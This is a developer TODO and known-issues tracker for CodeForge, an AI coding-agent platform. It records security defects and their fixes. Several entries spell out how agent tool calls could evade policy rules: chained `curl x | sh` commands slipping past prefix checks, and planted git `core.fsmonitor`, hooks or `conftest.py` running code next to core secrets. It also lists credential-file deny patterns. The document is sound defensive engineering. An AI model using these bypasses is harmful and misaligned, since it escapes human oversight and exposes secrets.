# CodeForge — TODO Tracker

> LLM Agents: This is your **primary** task reference.
> Always read this file before starting work; the **Current work** line below states the current priority.
>
> **Current work (2026-10-01):** the [Known Issues](#known-issues) are being fixed milestone by milestone
> ([fix plan](known-issues-fix-plan.md)): S0 to S5 are done; S6 (trust, compliance, unwired features) and the
> follow-up Known Issues found by the fix reviews are in progress.
> The 2026-03-28 agent pipeline TODOs live in `docs/plans/2026-03-28-agent-improvement-todos.md` (all checked off).

### How to Use This File

- Before starting work: Read this file to understand what needs to be done
- After completing a task: Mark it `[x]`, add completion date, move to "Recently Completed" if needed
- When discovering new work: Add items to the appropriate section with context
- Format: `- [ ]` for open/pending, `- [x]` for done (with date)
- Cross-reference: Link to feature docs, architecture.md sections, or issues where relevant

---

- [x] (2026-10-01) Agent instructions follow the AGENTS.md convention: `CLAUDE.md` is replaced by [`AGENTS.md`](../AGENTS.md) (structure after the Scavengarr `AGENTS.md`: workflow, overview, architecture, dependencies, language rules, testing, agent system and cross-language rules, subagents, dev container, navigation). Descriptive catalogues moved to [architecture/project-reference.md](architecture/project-reference.md), the E2E startup procedure to [testing/e2e-setup.md](testing/e2e-setup.md). Claude Code reads `AGENTS.md` when no `CLAUDE.md` exists (v2.1.277 or newer).
- [x] (2026-09-30) SessionStart hook for Claude Code on the web (`.claude/hooks/session-start.sh`, registered in `.claude/settings.json`): installs the CI toolchains and dependencies and starts PostgreSQL 18 + NATS JetStream for the Go tests, see [dev-setup](dev-setup.md#claude-code-on-the-web-sessionstart-hook)

### Known Issues

> Verified defects found in the docs/code reconciliation of 2026-09-29 on `staging` (HEAD `cb9b63ce`).
> IDs (KI-1..KI-62) are stable and never renumbered; other docs link here (`todo.md#known-issues`) by ID.
> Every unchecked item is an open task: when its fix lands, check it `[x]` with the date and keep the entry.

#### CI and tooling

- [x] (2026-09-29) **KI-1 CI red on `staging`** (high): CI has been red on `staging` since 2026-03-24: `poetry.lock` is stale (psutil added without re-locking), `ruff` is not a Poetry dependency although CI runs `poetry run ruff`, golangci-lint v2.1.6 (built with go1.24) refuses the go 1.25 module (v2.5.0 reports 11 findings), and CI does not run for pull requests to `staging`. Evidence: `.github/workflows/ci.yml:7`, `.github/workflows/ci.yml:62`, `.github/workflows/ci.yml:85`, `pyproject.toml:33`. **Fixed (S0):** `poetry.lock` regenerated; `ruff` 0.15.1 pinned as Poetry dev dependency (in sync with the ruff-pre-commit rev); golangci-lint pinned to v2.11.4 in CI and the devcontainer (v2.1.6 cannot lint the go 1.25 module; v2.10+ is needed for the G706 exclude in `.golangci.yml`) plus fixes for its findings; CI also runs for pull requests to `staging`.
- [x] (2026-09-30) **KI-2 Test suites rotted while CI was red** (high): Python has 2 collection errors (`tests/evaluation.py` is shadowed by the `tests/evaluation/` package; `test_score_key_normalization.py` imports names moved to `_benchmark_gemmas.py`) and 127 failing tests in 43 files; in Go, TestCORSWildcardRestriction, TestHandleListPolicies (nil-pointer panic), TestAPIKeyStore_TenantIsolation and TestOAuthState_GetExpired fail, `internal/service` hangs until the 10 min timeout, and the contract test rewrites `testdata/contracts/*.json` without a trailing newline. The frontend has 13 `tsc --noEmit` errors (some are runtime bugs, see KI-40) and 4 failing vitest tests; neither the type check, vitest nor any `-tags=integration` test runs in CI. Evidence: `workers/tests/test_score_key_normalization.py:16`, `scripts/test.sh:73`, `.github/workflows/ci.yml:114-120`. **Fixed (S0):** every failing test root-caused and repaired (none skipped or weakened); real bugs found on the way fixed (logger kwargs in context_reranker/history/skills safety, tool router cap, over-matching `rm -rf` blocklist, `_clear_processed`, Quarantine/Routing page crashes, missing MCP client methods, canvas image export, a 10-minute deadlock and a data race in `internal/service` tests); contract fixtures keep their committed format; CI gains `go vet -tags=integration`, the `integration`-tagged Go tests, `npm run typecheck` and `npm run test`; the smoke job seeds the admin. Result: pytest 2541 passed, `go test -race ./...` and integration tests green, vitest 398 passed, `tsc` clean. Remaining nit: the provider registry tests in `internal/port/*` are not repeatable with `-count>1` (global registries; CI uses `-count=1`).
- [x] (2026-09-29) **KI-3 Dependencies with known vulnerabilities** (high): The Security Scanning job is red: govulncheck finds 8 reachable vulnerabilities in 5 Go modules (chi v5.2.5 RealIP spoofing, pgx v5.9.1 placeholder SQL injection, otel sdk v1.42.0, grpc v1.79.2, x/net v0.51.0, x/text v0.35.0), `npm audit --omit=dev` reports 4 critical and 1 high (seroval, maplibre-gl via @unovis 1.6.4, lodash-es, protocol-buffers-schema, yaml) and pip-audit 30+ advisories (cryptography, pyjwt, starlette, mcp, python-multipart, requests, urllib3, aiohttp, pytest, ...). `setuptools<82` is still pinned for agentneo, which was removed on 2026-03-05. Evidence: `go.mod:9`, `go.mod:11`, `frontend/package.json:24-25`, `pyproject.toml:34`. **Fixed (S0):** Go chi v5.3.0, pgx v5.9.2, OpenTelemetry v1.44.0, grpc v1.83.1, x/net v0.55.0, x/text v0.39.0; `@unovis` ^1.7.1 plus in-range npm updates; Python updates (cryptography, pyjwt, starlette, mcp, python-multipart, aiohttp, ...), obsolete `setuptools<82` pin removed. govulncheck (module findings), `npm audit --omit=dev --audit-level=high` and pip-audit are clean.

#### Security and policy

- [x] (2026-09-30) **KI-4 Policy rules never match real tool calls** (critical): The agent loop requests permission with snake_case tool names (`bash`, `read_file`, `edit_file`, ...), the raw JSON arguments as `command` and no `path`, and the Claude Code executor sends `file:read`-style names, while every preset matches `Read`/`Edit`/`Write`/`Bash`/`Grep` exactly. Decisions therefore come only from the mode default: `headless-permissive-sandbox` and `trusted-mount-autonomous` allow everything (curl/wget/ssh, `.env` edits), `plan-readonly` denies even the LLM call, and the default `headless-safe-sandbox` asks for every call. Evidence: `workers/codeforge/tool_executor.py:75-77`, `internal/service/policy.go:257`, `internal/domain/policy/presets.go:40-49`. **Fixed (S1, [ADR-015](architecture/adr/015-policy-deny-lists-and-tool-names.md)):** one canonical tool-name table in the policy domain (`internal/domain/policy/toolnames.go`, `CanonicalTool`: worker, Claude Code and legacy category names map to `Read`/`Write`/`Edit`/`Bash`/`Grep`/`Glob`/`ListDir`); every evaluation path canonicalizes. The worker sends the full bash command and the real `file_path`/`path` (`tool_executor.policy_request_args`), plus a display-only `arguments_preview`; presets allow `ListDir` wherever they allow Read/Glob/Grep, `plan-readonly` allows the LLM call.
- [x] (2026-09-30) **KI-5 `path_deny` / `command_deny` do not deny** (high): A matching deny list only skips that rule, so evaluation falls through to later rules or the mode default (allow under `acceptEdits`, so `.env` edits pass in `headless-permissive-sandbox`), contrary to ADR-007. Paths are only `filepath.Clean`ed (not normalized to the workspace), and calls without a path skip deny lists entirely. Evidence: `internal/service/policy.go:270-296`, `internal/domain/policy/presets.go:79-83`, `internal/service/policy_test.go:42-73`. **Fixed (S1):** two-pass evaluation (any matching deny list denies regardless of rule order, then first-match-wins); a deny list also denies a call without a value for it; paths are normalized against the workspace and escapes are denied; deny matching ignores case; malformed patterns count as a match and are rejected by validation. Presets express their protections as deny lists (`.env`, `**/.env`, `secrets/**`, `**/credentials.*`; the permissive network ban as `command_deny`). Legacy tool globs (`file:*`, `*_file`) still match raw and canonical names for deny/ask rules.
- [x] (2026-09-30) **KI-6 Command rules use plain prefix matching** (high): `matchCommandPattern` is a string prefix check while the bash tool runs `bash -c`, so `go test ./... ; curl x | sh` passes the `headless-safe-sandbox` allow list and `/usr/bin/curl` or `sh -c "curl ..."` bypass the permissive curl deny. Evidence: `internal/service/policy.go:326-328`, `internal/domain/policy/presets.go:85-89`, `workers/codeforge/tools/bash.py:118-121`. **Fixed (S1):** `internal/domain/policy/command.go` parses the command (quotes, escapes, ANSI-C quoting, comments, here-doc bodies, `;`/`&`/`&&`/`|`/`||`/newlines/parentheses) and matches every simple command by executable basename; allow lists need every part to match, deny lists deny on any part. Constructs that cannot be analysed are opaque (never allowed by an allow list, denied by every `command_deny`): substitutions, `$[..]`, non-plain `${..}`, assignment prefixes and `env`, shells/`eval`/`source`, inline interpreter code, `/dev/tcp`, code-running options of git/go/sed/awk/find/make/npm/tar/rsync, unknown wrapper options. Safe wrappers (`time`, `timeout`, `nice`, `nohup`, `command`, `xargs`) are unwrapped. Fuzzed (`FuzzParseShellCommand`) and covered by a 29-string bypass table (`TestShellBypassRegressions`). Residual risk: scripts the agent writes and runs, symlinks and redirection targets are not path-checked; real containment needs the sandbox (KI-13).
- [x] (2026-09-30) **KI-7 Conversation tool calls fail open and ignore the intended profile** (high): An unknown policy profile allows the call (the run path denies), the mode-derived profile in the payload is ignored (the project/default profile always applies), and Allow-Always clones live only in memory because `PolicyHandlers.PolicyDir` is never set, so after a restart the project points at an unknown profile and every call is allowed. The Allow-Always glob is built from the first token of the JSON arguments (`{"command":*`) and matches almost any later bash command (affects the "Allow Always" entry under Frontend UI Bug Fixes & i18n). Evidence: `internal/service/runtime_execution.go:201-205`, `cmd/codeforge/main.go:813-817`, `internal/service/policy.go:177-181`. **Fixed (S1):** an unknown profile, unknown mode or missing project denies on both the run and the conversation path, with the reason sent to the worker. One resolver (`conversationPolicyProfile`) serves dispatch and evaluation: project `policy_profile`, then `config["policy_preset"]`, then the mode-derived preset, then the default. The worker reports the turn's mode (`mode_id` on `runs.toolcall.request`). Allow-Always extends the profile that decided the call (`agui.permission_request.profile`) in a per-project clone `{profile}-custom-{projectID}` that replaces its base only for that project and never re-pins the project; Bash rules list every executable of the approved command. Persistence: `policy.custom_dir` (default `data/policies`) is loaded at start and written back atomically to each profile's source file; two files defining one profile fail startup; `trust_minimum` allow rules need a trust annotation that meets them.
- [x] (2026-09-30) **KI-8 Policy profile map is not synchronized** (high): `PolicyService.profiles` is a plain map written by HTTP handlers (`SaveProfile`, `DeleteProfile`, `PrependRule` via Allow Always) and read by NATS tool-call handlers without a lock, so a policy edit during a run can crash the Go Core with a fatal concurrent map read/write. Evidence: `internal/service/policy.go:18-21`, `internal/service/policy.go:98`. **Fixed (S1):** a `sync.RWMutex` guards the map; changes and their file writes are serialized; profiles are replaced, never modified in place (race test).
- [x] (2026-09-30) **KI-9 Editors can overwrite built-in presets** (medium): `POST /api/v1/policies` (admin/editor) calls `SaveProfile`, which has no preset check, so an editor can replace `headless-safe-sandbox` (the default profile) with an allow-all profile that persists via the policy directory; `DeleteProfile` and `PrependRule` do reject presets. Evidence: `internal/adapter/http/handlers_policy_crud.go:67-91`, `internal/service/policy.go:94-100`. **Fixed (S1):** `SaveProfile` rejects preset names with `ErrConflict` (HTTP 409); a new profile never overwrites an existing policy file (409); validation errors return 400.
- [x] (2026-09-30) **KI-10 Mode tool restrictions are not enforced** (medium): Modes declare PascalCase `Tools`/`DeniedTools` that never match the worker's tool names, and `denied_tools` is only parsed and rendered into prompts, so read-only modes (architect, reviewer, security) are still offered `write_file`, `edit_file` and `bash`. Evidence: `workers/codeforge/models.py:79`, `internal/service/mode_prompt.go:83-84`, `workers/codeforge/agent_loop.py:226-252`. **Fixed (S1):** mode tool lists use canonical names (`mode.BuiltinToolNames` = `policy.BuiltinTools()`) and are enforced on the run and conversation paths (`policy.WithModeTools`): `DeniedTools` denies any tool, a non-empty `Tools` list denies built-in tools it does not list (MCP tools, `LLM`, skills, handoff are only restricted by `DeniedTools`). Read-only modes can no longer write or run bash. Checkpoints cover Edit, Write and Bash (canonical names).
- [x] (2026-09-29) **KI-11 Rate limiting and audit IPs use spoofable headers** (high): `chimw.RealIP` runs before the rate limiters, so `True-Client-IP` / `X-Real-IP` / `X-Forwarded-For` choose the bucket (bypassing the login brute-force limiter) and the audit-log IP, and rotating values fills the 100k bucket cap so new clients get 429. Evidence: `cmd/codeforge/main.go:924`, `internal/middleware/ratelimit.go:165-170`, `internal/middleware/audit.go:28`. **Fixed (S0):** `chimw.RealIP` (deprecated in chi v5.3.0) replaced by `middleware.ClientIP` (`internal/middleware/clientip.go`), which honours forwarding headers only from `server.trusted_proxies` / `CODEFORGE_TRUSTED_PROXIES` and runs first in the chain; rate limit keys group IPv6 by /64. Fixed early in S0 because the chi upgrade made `RealIP` a lint error.
- [x] (2026-09-30) **KI-12 WebSocket fan-out and ticket auth are broken** (high): Every event is broadcast to every tenant's clients (`BroadcastToTenant` has no callers), and broadcasts write to all clients under the hub lock without a write timeout, so one stalled client blocks all live updates. `POST /api/v1/ws/ticket` panics because `WSTickets` is never wired, so the JWT still travels in the WebSocket URL (audit SEC-008 / WT-12 not in effect). Evidence: `internal/adapter/ws/events.go:10-21`, `internal/adapter/ws/handler.go:91-111`, `internal/adapter/http/handlers_auth.go:485`. **Fixed (S1):** `BroadcastEvent` delivers only to clients of the tenant in ctx (`tenantctx.Lookup`, no default fallback); an event without a tenant is dropped and logged (fail closed). `BroadcastGlobal` (port `broadcast.GlobalBroadcaster`) is the one explicit all-tenant path, used only for `model.health` of the shared LiteLLM proxy. NATS requests carry `tenant_id` and the worker echoes it on every result/stream subject (`withPayloadTenant`; a stored run/conversation/review/A2A task wins via `withEntityTenant` / `RuntimeService.loadRunScoped`); background work keeps only the request tenant (`detachTenant`); handoff requests and runs carry the source run's tenant. Each client has a bounded send queue (1024) drained by its own writer with a 10 s write timeout; a full queue or failed write drops only that client. `main.go` wires the ticket store: `POST /api/v1/ws/ticket` issues single-use tickets (30 s TTL) bound to user and tenant, `GET /ws?ticket=` redeems them in the hub, `?token=` is rejected (401). The frontend fetches a ticket per connection attempt, keeps the socket across token refreshes, closes it on logout and while the password must be changed. Core and worker must be deployed together (events from an old worker without `tenant_id` are dropped).
- [x] (2026-09-30) **KI-13 Sandbox and hybrid modes provide no isolation** (high): A container is created per run, but `SandboxService.Exec` has no callers and the worker runs tools as local subprocesses (`bash -c` with the worker's filesystem, network and credentials). `--cpus` uses integer division, so a `cpu_quota` below 1000 becomes `--cpus=0` (unlimited). Evidence: `internal/service/sandbox.go:217`, `internal/service/sandbox.go:91`, `workers/codeforge/tools/bash.py:118-124`. **Fixed (S1):** fail closed (D-S3): runs, agentic conversations and benchmark runs in `sandbox`/`hybrid` mode (explicit or via the project config `execution_mode`) are rejected with HTTP 400 before anything is created; the worker completes any non-`mount` `runs.start` as failed; handoffs declare `mount`; the benchmark UI shows sandbox/hybrid as not available; `--cpus` is a decimal and non-positive quotas are rejected. Running tools inside the container stays a roadmap item. Follow-ups: goal discovery still creates an empty conversation before the rejection; preset descriptions still say "sandbox".
- [x] (2026-09-30) **KI-14 Dev compose exposes PostgreSQL and NATS** (medium): `docker-compose.yml` publishes PostgreSQL (default password `codeforge_dev`) and NATS 4222/8222 without authentication on all interfaces, so anyone on the host's network can read the database or publish forged NATS messages (audit SEC-003, SEC-004, INFRA-007, INFRA-008 still open). Evidence: `docker-compose.yml:77-82`, `docker-compose.yml:116-119`. **Fixed (S1):** all 10 published dev ports in `docker-compose.yml` bind to 127.0.0.1 (remote access via SSH tunnel).
- [x] (2026-09-30) **KI-63 Tool-call approvals are not tenant-checked** (medium): `POST /runs/{id}/approve/{callId}` and the conversation approval route call `RuntimeService.ResolveApproval(runID, callID, decision)`, which resolves the pending in-memory approval by IDs only, without checking that the run belongs to the caller's tenant. Knowing a run ID and call ID of another tenant is enough to approve or deny its tool call. Evidence: `internal/service/runtime_approval.go:106`, `internal/adapter/http/handlers_agent_features.go:486`, `internal/adapter/http/handlers_conversation.go:147`. Found during the KI-12 fix (2026-09-30). **Fixed (S2):** pending approvals are keyed by run, call and tenant; `ResolveApproval` resolves only in the caller's tenant (another tenant gets 404 and the approval stays pending); bypass-approvals and stop load the conversation tenant-scoped first (404 otherwise).
- [x] (2026-09-30) **KI-64 Tenant propagation over NATS is per payload** (low): since KI-12 every NATS request struct carries `tenant_id`, the worker echoes it and each Go subscriber scopes its context by hand (`withPayloadTenant`, `loadRunScoped`); a new subject that misses one of the three edits silently loses its live events. Outgoing payloads fill `tenant_id` from `tenantctx.FromContext`, which falls back to the default tenant instead of failing closed. Follow-up: stamp the tenant as a NATS header on publish and restore it in the adapter (like `X-Request-ID`), and use `tenantctx.Lookup` for outgoing payloads. Evidence: `internal/service/tenant_scope.go`, `internal/service/agent.go:95`. Found in the KI-12 code review (2026-09-30). **Fixed (S6):** every Go publish carries the tenant as the `X-Tenant-ID` header; handlers use it when neither request nor payload sets a tenant (request > payload > header, `tenantctx.Explicit`); the worker binds the header tenant while handling a message and echoes it on everything it publishes; outgoing payloads take the tenant from the context (`outgoingTenant`; a missing tenant is logged as an error, the publish is not failed yet).
- [x] (2026-09-30) **KI-68 Policy profiles are one global namespace** (medium): policy profiles are not tenant-scoped; any editor of any tenant can list profiles and replace any non-preset profile via `POST /policies` (since S1 the change is also written to the policy directory). Evidence: `internal/service/policy.go`, `internal/adapter/http/handlers_policy_crud.go`. Found in the S1 security review (2026-09-30). **Fixed (S6):** custom profiles live in `<policy.custom_dir>/<tenant_id>/` (tenant must be a UUID, atomic writes); lookup is the caller's tenant, then legacy flat files (default tenant only, read-only), then the global read-only presets; the listing shows presets plus the caller's own profiles; save/replace/delete/Allow-Always touch only the caller's tenant (an Allow-Always clone goes to the project's tenant); runs, conversations, `EvaluatePolicy` and Claude Code resolve profiles in the run's tenant. A flat Allow-Always clone made for another tenant's project must be moved to `<dir>/<tenant>/` to apply again.
- [x] (2026-09-30) **KI-69 Policy follow-ups from S1** (low): the worker still offers tools a mode denies to the LLM (they are refused at call time); Allow-Always clones are snapshots of their base (later preset changes do not reach them); runs ignore the project's policy profile (request or default profile only); the Slack and email approval providers do not receive `profile` or `arguments_preview`; Bash redirection targets are not checked against `path_deny`. Found during the KI-4..KI-10 fixes (2026-09-30). **Fixed (S6):** (a) the worker offers the LLM only the tools its mode allows (`ToolRegistry.restrict_to_mode`, same rule as `policy.WithModeTools`, canonical names via `policy_args.canonical_tool`, kept equal to Go by a test); (b) runs resolve the profile request > project `policy_profile` / config `policy_preset` > default (conversations additionally pick a preset from the mode's autonomy); (c) Slack and email approvals show `profile` and `arguments_preview` (Slack escapes `&<>` and backticks, email HTML-escapes values and keeps line breaks out of the subject); (d) Bash redirection targets are checked against `path_deny` (see ADR-015; unknown targets fail closed); (e) Allow-Always clones stay snapshots of their base profile (documented, no change).
- [x] (2026-09-30) **KI-77 Go core runs git in agent-writable workspaces without hardening** (high): core and worker share the workspace volume and UID, and agent tools can write `.git/config`, `.gitattributes` and hooks (Bash, and Write/Edit since `resolve_safe_path` does not block `.git/`). Every Go git call in a workspace honours that config: a planted `core.fsmonitor` runs on `git add -A`, `write-tree` and `diff --cached`, clean/smudge filters on `add`/`read-tree -u`, external diff drivers on `diff`, hooks such as `reference-transaction` on `update-ref`, credential helpers and `core.sshCommand` on push. Checkpoints run on every allowed file-changing tool call, so an agent can execute code in the core container (JWT secret, LLM key encryption secret). Affected: checkpoint/rewind/patch delivery (`internal/service/checkpoint.go`, `git_worktree.go`, `deliver.go`), the gitlocal provider (`GET /projects/{id}/git/*`). Found in the S2-B and S3 security reviews (2026-09-30); being fixed with the S3 review round. **Fixed (S3 review):** every Go git call in a workspace (checkpoints, delivery incl. `gh`, gitlocal/GitHub providers, workspace init, ls-remote) goes through `internal/git/workspace.go`: sanitised environment (no global/system config or attributes, inherited `GIT_*` dropped, no prompts/pager/editor), `GIT_CONFIG_COUNT` overrides (hooks, fsmonitor, credential helpers, signing, gc/maintenance, submodule recursion off; filter drivers neutralised; https/http/ssh/git transports only) and pre-checks that execute nothing (`.git` a real directory without `commondir`/alternates or symlinked config/refs/logs/objects; config keys on an allowlist, fail closed). Worker file tools refuse `.git` components; presets deny Write/Edit on `**/.git/**`. Behaviour: global git config is ignored for workspace git; repositories with config keys outside the allowlist are refused; pull/push via local-path remotes are refused. Residual: a still-running agent process could rewrite `.git/config` between check and git's read (needs separate tool UIDs, KI-71); the SVN provider is not hardened yet.
- [x] (2026-09-30) **KI-80 Copilot token handed to every user** (high): `POST /api/v1/copilot/exchange` returns the platform's GitHub Copilot token (with its expiry) to any authenticated user of any tenant and role. Evidence: `internal/adapter/http/handlers_llm.go` (`HandleCopilotExchange`), `internal/adapter/http/routes.go`. Found in the S6 tenancy work (2026-09-30); fix in progress. **Fixed (S6):** `/copilot/exchange` is platform-admin only and returns `{status, expires_at}` (the token never leaves the server; failures are logged server-side); `GET /llm/models` strips credential parameters (key, secret, token, password, credential, authorization, also nested); subscription provider connect/disconnect (the shared `.env` keys) are platform-admin only; the frontend hides shared LLM actions from other users (`is_platform_admin`).
- [ ] **KI-81 Auto-agent runs workspace tests inside the Go Core** (high): `AutoAgentService.runWorkspaceTest` (`internal/service/autoagent.go`) runs `python -m pytest` in the agent-writable workspace from the Go Core process with the core's full environment (JWT secret, database URL, LLM key encryption secret), so an agent-written `conftest.py` or pytest plugin runs as the core. Found in the KI-77 security review (2026-09-30); fix in progress (route the test run through the worker).
- [ ] **KI-82 Git config allowlist refuses common repositories** (medium): the KI-77 allowlist refuses whole repositories for benign keys such as `core.excludesfile`, `commit.template`, `rerere.enabled`, `log.date`, `tag.sort`; linked worktrees and submodule working directories are refused too (their `.git` is a file). Found in the KI-77 review (2026-09-30); allowlist extension in progress.
- [ ] **KI-83 LSP language servers run in the Go Core** (medium; high when `lsp.enabled`): language servers are started by the Go Core in the agent-writable workspace with the core's environment and are not contained; servers that load project plugins or run project tooling (TypeScript server plugins from `node_modules`, `go list` with workspace `go.env`/`GOFLAGS`) can execute agent-written code next to the JWT secret and DB credentials. Same class as KI-77/KI-81: run them in the worker or a separate container. Found in the KI-81 grep for core-side program starts (2026-10-01).
- [ ] **KI-84 Slack approval buttons do nothing** (low): the Slack feedback provider posts Approve/Deny buttons, but CodeForge has no Slack interaction endpoint, so a click never reaches the run. Link to the web UI approval page (`/approvals/<run>/<call>`, KI-57) instead, or implement signed interactions. Found in the KI-57 work (2026-10-01).
- [ ] **KI-85 Inbound webhooks act only in the default tenant; no GitLab PM token** (medium): the VCS and PM webhook routes are unauthenticated (HMAC only) and run in the default tenant (or the one named by `X-Tenant-ID`), so projects of other tenants cannot be synced by webhooks; the VCS webhooks still resolve the project with the substring lookup `GetProjectByRepoName`. GitLab PM sync has no config key for an API token, so private GitLab projects fail at sync time (now visible as a `pm.sync` event with `status: error`). Found in the KI-56 work (2026-10-01).
- [ ] **KI-86 Go Core assumes a single replica** (low): pending HITL approvals and auto-agent workspace-test waiters live in memory of the Go process that asked, while results arrive on shared durable consumers; with two replicas a decision or test result can land on the other replica and is dropped (the run then times out). Run one Go Core replica, or move these waits to per-request subjects / shared state. Found in the S3-F review (2026-10-01).
- [ ] **KI-87 SVN password on the command line** (low): the SVN provider passes `--password` as an argument, visible in `/proc/<pid>/cmdline` to processes of the same container (agent tools, until KI-71 separates their UID). Pass it via `--password-from-stdin` (svn 1.10+) or an auth file in the private config directory. Found in the S3-F work (2026-10-01).
- [ ] **KI-15 A2A and handoff trust gates are bypassed** (medium): The A2A endpoints and AgentCard sit behind the global JWT middleware, so A2A API keys are rejected, and inbound A2A prompts are stored as untrusted but published without quarantine. `HandoffService` is never constructed, so Python handoffs skip quarantine, inbox delivery and `handoff.status` events (War Room handoff arrows never render). Evidence: `cmd/codeforge/main.go:921`, `internal/middleware/auth.go:27-38`, `internal/adapter/a2a/executor.go:64-84`, `internal/service/handoff.go:36`.
- [x] (2026-09-30) **KI-16 Experience pool has no tenant isolation and cannot be disabled** (medium): The worker always creates one `ExperiencePool` with the zero-UUID tenant and ignores `experience.enabled` / `CODEFORGE_EXPERIENCE_ENABLED` (documented default: off), `confidence_threshold` and `max_entries`, so all experiences land in the zero tenant and similar prompts can be answered from cache without running the agent loop. Evidence: `workers/codeforge/consumer/__init__.py:137`, `workers/codeforge/memory/experience.py:39`, `internal/config/config.go:229-233`. **Fixed (S6):** the worker honours `experience.enabled` (default off), `confidence_threshold` and `max_entries`; every pool statement filters by the conversation's `tenant_id` (no tenant, no cache); the agent loop never reads or writes the cache (a cached final message would claim work that was not done); only the first turn of a simple chat (one text-only user message, `agentic=false`) can be answered from the cache, streamed like a live answer, cost 0; cache errors fall back to the normal chat.

#### Messaging and runtime

- [x] (2026-09-30) **KI-18 NATS delivery is unsafe** (high): Go durable consumers have a 5 min inactivity threshold and deliver from the stream start, so after more than 5 min of Go Core downtime they are recreated and replay up to 30 days of messages (duplicate conversation messages, re-finalized runs). Python work handlers ack only at the end with a 30 s ack wait and unlimited redelivery, so with several workers any run longer than 30 s executes twice, and per-run cancel listeners are never unsubscribed and can exhaust the 200-consumer limit. Evidence: `internal/adapter/nats/nats.go:240-251`, `workers/codeforge/consumer/__init__.py:209-234`, `workers/codeforge/runtime.py:72-96`. **Fixed (S2, [ADR-016](architecture/adr/016-nats-delivery-semantics.md)):** Go and worker ensure one shared durable pull consumer per subject and side (`codeforge-go-*` / `codeforge-py-*`) without inactivity threshold; a new durable starts at new messages, an existing one keeps its position (no replay on recreation); `MaxDeliver` 4, `AckWait` 90 s, in-progress heartbeats every `AckWait/3` while a handler runs. `runs.start`, `conversation.run.start`, `tasks.agent.*` and `benchmark.run.request` are accepted with a confirmed ack (at-most-once; a failure is reported as a failed completion with publish retries, never re-executed); the DLQ copy drops `Nats-*` headers so JetStream dedup cannot swallow it; in-progress acks are lazy and capped (Go: approval timeout + 5 min). Per-run cancel listeners and heartbeats are released by `RuntimeClient.close()`. Gaps: KI-65 (no Go-side watchdog for conversation runs), KI-67.
- [x] (2026-09-30) **KI-19 Python retry/DLQ path is unreachable** (medium): Retries are counted from a `Retry-Count` header nobody sets, so failed `tasks.agent.*` messages are NAK'd forever and never dead-lettered; invalid payloads are NAK'd without delay in a hot loop, and failures after the dedup mark are acked as duplicates on redelivery. Go dead-letters handler errors, but messages that exhaust `MaxDeliver` through ack timeouts are dropped without a DLQ copy. Evidence: `workers/codeforge/consumer/_base.py:62-70`, `workers/codeforge/consumer/_tasks.py:67-76`, `workers/codeforge/consumer/_base.py:145-160`. **Fixed (S2):** retries use `msg.metadata.num_delivered` (NAK with 2 s delay before the last attempt, then publish to `{subject}.dlq` and ack); invalid payloads go to the DLQ at once and are terminated (`msg.term()`) in every handler; a failed DLQ publish NAKs instead of acking; a failed request is removed from the dedup cache so its redelivery runs. Go uses the same rules (`Retry-Count` header removed). Also fixed: `_publish_error_result` of the base mixin shadowed the conversation one (TypeError killed the conversation loop), the compact handler acked twice.
- [x] (2026-09-30) **KI-20 Schema validation skips run and context subjects** (low): `Validate()` accepts any JSON on `runs.*` and does not check `context.*` / `repomap.*`, although payload structs exist for them. Evidence: `internal/port/messagequeue/validator.go:14-17`, `internal/port/messagequeue/validator.go:122-133`. **Fixed (S2):** every `runs.*`, `context.*` and `repomap.*` subject with a port struct is validated against it (`runs.cancel`, `runs.trajectory.event` stay JSON-only); a `null` payload is rejected like `{}`.
- [x] (2026-09-30) **KI-65 At-most-once work has incomplete Go-side watchdogs** (medium): `conversation.run.start` (and since the S2 review `tasks.agent.*`) is acked on accept (ADR-016), and the worker's wall-clock timeout dies with the worker, so a crashed worker leaves the conversation "running" until the user stops it. The `runs.start` timer does not cover policies without `TimeoutSeconds`, runs in `quality_gate`, or any run after a Go Core restart (in-memory timer); `HeartbeatTimeout` is only evaluated when a tool call arrives. Evidence: ADR-016 section 6, `internal/service/runtime.go` (`StartRun` timer). Found during the KI-18 fix (2026-09-30). `tasks.agent.*`: `ActiveWorkService.ReleaseStaleWork` only resets a task without a row update for 30 min to `pending` (not failed, agent status not reset, a healthy long task is released too). SIGTERM: the worker's `stop()` drains NATS while at-most-once handlers still run, so their completions can be lost (the give-up path fails them, shutdown does not; the grace would have to fit Docker's `stop_grace_period`). A `tasks.cancel` published while the task still waits in NATS is lost, so the task runs later (found in the KI-22 fix). **Partly fixed (S3):** runs stuck in `quality_gate` are failed by the stuck-work watchdog (gate heartbeats, NATS backlog probe); the other parts are in progress (S2 follow-ups). **Fixed (S2):** heartbeats (with `tenant_id`; conversation runs with `turn_id`; backend tasks via `tasks.heartbeat`) are stored (migration 098); the stuck-work watchdog stops lost runs as `timeout`, fails lost conversation turns and lost tasks (agent reset) after `heartbeat_timeout + 2 x heartbeat_interval`; the active conversation turn is persisted; `ReleaseStaleWork` removed; SIGTERM fails accepted work before NATS is drained (`stop_grace_period: 45s`); a `tasks.cancel` for a queued task is remembered (stream-sequence registry). Review round in progress (tasks that are never accepted, unconfirmed accepts on the last delivery, turn checks after a lost-worker end, heartbeat interval sent to the worker).
- [x] (2026-09-30) **KI-66 Worker dedup keys are too coarse** (medium): the worker dedups `repomap-{project_id}`, `retidx-{project_id}`, prompt-evolution and handoff requests by project or source run, so a second legitimate request for the same project is skipped as a duplicate while the key stays in the 10,000-entry cache. Evidence: `workers/codeforge/consumer/_repomap.py`, `_retrieval.py`, `_handoff.py` (`_is_duplicate`). Found during the KI-19 fix (2026-09-30). **Fixed (S2):** at-least-once requests are deduplicated per message (key plus stream sequence): repo map, index, graph, prompt evolution, memory, handoff; at-most-once work keeps its run-ID key.
- [x] (2026-09-30) **KI-67 Worker consumer lifecycle gaps** (low): the worker does not recreate a durable that is deleted while it runs (its fetch loop stops after repeated errors; Go has a health monitor), it creates the `CODEFORGE` stream with default settings when missing (the Go Core should own the stream config), Go keeps heartbeat entries for conversation run IDs forever, and notification subjects still use per-run ephemeral JetStream consumers instead of core NATS. Found during the KI-18 fix (2026-09-30). **Partly fixed (2026-09-30):** a deleted durable is re-attached, the error counter resets on healthy fetches, a loop that gives up fails the worker's unfinished work and exits 1; notification consumers use ack policy `none`. Still open: stream created with default settings by the worker, Go conversation heartbeat entries kept forever, notifications on per-run JetStream consumers instead of core NATS, threads (repo map, retrieval, graph) delay the exit after give-up. **Fixed (S2):** the worker waits up to 120 s for the Go Core to create the stream instead of creating it; conversation heartbeats are stored per active turn, not kept in memory; the worker exits without waiting for indexing threads. Left on purpose: notifications stay on per-run JetStream consumers (the cancel registry needs stream sequences, which core NATS does not have; per-run consumers are released since KI-18).
